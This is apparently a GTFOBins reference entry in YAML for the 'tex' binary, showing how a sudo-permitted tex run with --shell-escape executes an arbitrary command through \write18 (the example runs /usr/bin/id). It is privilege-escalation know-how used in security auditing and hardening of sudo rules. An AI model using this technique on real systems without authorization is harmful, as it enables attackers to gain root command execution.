description: `tex` has a similar behaviour as [`pdftex`](/gtfobins/pdftex/)
functions:
  sudo:
    - code: |
        echo "\documentclass[12pt]{article} \begin{document} \write18{/usr/bin/id} \end{document}" > file.tex
        tex -interaction=nonstopmode --shell-escape file.tex
